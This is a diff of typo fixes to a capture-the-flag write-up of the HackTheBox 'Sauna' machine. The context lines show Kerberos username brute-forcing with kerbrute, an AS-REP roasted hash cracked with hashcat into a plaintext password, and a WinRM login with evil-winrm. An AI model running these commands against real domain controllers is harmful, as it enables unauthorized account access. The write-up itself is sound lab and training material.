@@ -44,9 +44,9 @@ PORT      STATE SERVICE
 49697/tcp open  unknown
 ```
 
-I was immediately interesting in digging further into DNS (53), the webserver (80), SMB (445), RPC (135) and LDAP (389). I also noted that it appears port 5985 is open, which could potentially allow access via WinRM if we can get user account credentials.
+I was immediately interested in digging further into DNS (53), the webserver (80), SMB (445), RPC (135) and LDAP (389). I also noted that it appears port 5985 is open, which could potentially allow access via WinRM if we can get user account credentials.
 
-An initial glance at DNS does not provide and further domain information.
+An initial glance at DNS does not provide any further domain information.
 ```
 └──╼ $dig any EGOTISTICAL-BANK.LOCAL @10.10.10.175
 
@@ -86,7 +86,7 @@ sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::8568:3f67:20fa:8bfe
 ; Transfer failed.
 ```
 
-I moved onto SMB, noting that we can gain access via a NULL session, not no shares are listed.
+I moved onto SMB, noting that we can gain access via a NULL session, but no shares are listed.
 ```
 └──╼ $smbclient -N -L \\\\10.10.10.175
 Anonymous login successful
@@ -158,9 +158,9 @@ CONTACT.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Dura
 INDEX.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 2373ms]
 ```
 
-I also used `ffuf` to look for vhosts based on the `egotisitcal-bank.local` scheme, but found nothing.
+I also used `ffuf` to look for vhosts based on the `egotistical-bank.local` scheme, but found nothing.
 
-Having exhausted most of my original ideas, I decided to attempt a username brute force against the Domain Controller using `kerbrute`. This was promising, as a number of usernames were found.
+Having exhausted most of my original ideas, I decided to attempt a username brute force attack against the Domain Controller using `kerbrute`. This was promising, as a number of usernames were found.
 ```
 └──╼ $./kerbrute_linux_amd64 userenum -d egotistical-bank.local --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
@@ -190,7 +190,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:11cf6c034550e60743978eee3919b619$2253ad8960197be1e5758a6c8890dbd075fc33b00b6e668f133473ecbab420b66ae41ec92c9b8b7b4751c936dbabd6e0a6e0c4e3a8cb7c76f6a215f7515bb367159f695b8be116a8f421a94f0ad20fa16b68237a7d58218f2eebd6b136f6c0d14c03edf90437b6d3e449850c30f2b63da95b920b16b4a788bd3a822a316e5b3397281a2954cafe6f4962bac25fdd25ecf15c38bb07f8763aa8d2c3f07b8a2267d2d0619ff393de61d95912dea8f4df8c62b0e7fd56bb9e580ae464b4d5b3fb30d00293a7066529bb319c3b2631c83b81652164192b84854907b6b62cef494e24405f6a77bcd56b388e56fefa9ac3afaac1ff8e97c2136878edc0bef84db68843
 ```
 
-I ran this through hashcat with the `rockyou.txt` wordlist and cracked the hash. This gave me the first set of valid credentials: `fsmith : Thestrokes23`
+I ran this through hashcat with the `rockyou.txt` wordlist and cracked the hash. This gave me the first set of valid credentials: `fsmith:Thestrokes23`
 ```
 └──╼ $hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
@@ -198,7 +198,7 @@ hashcat (v6.2.6) starting
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:11cf6c034550e60743978eee3919b619$2253ad8960197be1e5758a6c8890dbd075fc33b00b6e668f133473ecbab420b66ae41ec92c9b8b7b4751c936dbabd6e0a6e0c4e3a8cb7c76f6a215f7515bb367159f695b8be116a8f421a94f0ad20fa16b68237a7d58218f2eebd6b136f6c0d14c03edf90437b6d3e449850c30f2b63da95b920b16b4a788bd3a822a316e5b3397281a2954cafe6f4962bac25fdd25ecf15c38bb07f8763aa8d2c3f07b8a2267d2d0619ff393de61d95912dea8f4df8c62b0e7fd56bb9e580ae464b4d5b3fb30d00293a7066529bb319c3b2631c83b81652164192b84854907b6b62cef494e24405f6a77bcd56b388e56fefa9ac3afaac1ff8e97c2136878edc0bef84db68843:Thestrokes23
 ```
 
-I then used these credentials to successfully log in via WinRM on port 5985.
+I then used these credentials to successfully log in via WinRM on port 5985 and retrieve the `user.txt` flag.
 ```
 └──╼ $evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
 
@@ -545,7 +545,7 @@ SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6
 SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share
 ```
 
-This ended up throwing me off and wasting a bunch of my time due to there being PoC exploit code written for this exact printer driver, found [here](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/). Attempting to exploit this manually and with Metasploit however simply resulted in the code hanging and no privileged access.
+This ended up throwing me off and wasting a bunch of time due to there being PoC exploit code written for this exact printer driver, found [here](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/). Attempting to exploit this manually and with Metasploit however simply resulted in the code hanging and no privileged access.
 
 Finally, I returned to attempting some more manual enumeration of the machine. As part of common checks for clear-text credentials, I ran the following query to look for WinLogon credentials.
 ```
